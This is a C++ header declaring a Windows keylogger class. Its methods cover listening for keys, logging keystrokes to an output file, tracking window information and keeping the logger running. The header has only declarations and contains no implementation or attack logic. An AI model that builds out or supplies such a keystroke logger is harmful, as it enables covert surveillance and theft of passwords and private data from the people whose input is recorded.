#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <Windows.h>
#include <fstream>

#include "windows_info.h"
#include "os_manager.h"
#include "key_input.h"

class Keylogger {
public:
    Keylogger(std::ofstream&& outputFile, OSManager& manager, WindowInfo& windowInfo, KeyInput& keyInput);
    Keylogger(std::ofstream&& outputFile);

    ~Keylogger();

    void Listen();
    void LogKeyStroke(int keyStroke);

private:
    OSManager& _manager;
    WindowInfo& _windowInfo;
    KeyInput& _keyInput;
    std::ofstream _outputFile;

    void writeToOutput(std::stringstream& output);
    void keepRunning();    
};

#endif